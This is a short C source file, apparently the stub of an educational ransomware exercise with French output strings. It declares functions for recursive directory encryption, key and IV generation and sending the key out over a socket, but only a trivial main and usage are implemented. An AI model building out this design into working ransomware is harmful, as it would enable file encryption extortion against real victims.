#include "ransomlib.h"
#include <dirent.h>
// for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>



void usage();

int is_encrypted(char *filename);

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);

int send_key(char *pKey, char *pIv);

int main (int argc, char * argv[])
{
	if (strcmp(argv[1],"-help")==0){
		usage();
	}
	printf("Bon travail!\n");
}


void usage(){
	
	printf("Ce programme a une vocation purement éducative! \n");
};

